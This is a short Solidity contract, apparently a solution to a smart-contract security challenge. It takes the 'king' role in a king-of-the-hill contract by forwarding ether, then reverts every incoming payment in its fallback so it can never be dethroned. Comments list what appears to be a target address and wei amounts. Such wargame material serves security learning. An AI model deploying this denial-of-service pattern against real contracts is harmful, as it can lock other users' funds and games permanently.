// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract DeafKing {

    function overthrowTheKing(address king) public payable returns(bool) {
        (bool success, ) = payable(king).call{value: msg.value}("");
        return success;
    }
//0x7416A83068d513cdc71A30A4697D74199FfEf82b
//1000000000000001
//1000000000000000

    // receive() external payable {
    //     // overthrowTheKing(msg.sender);
    //     revert();
    // }

    fallback() external payable { 
        revert();
    }
}
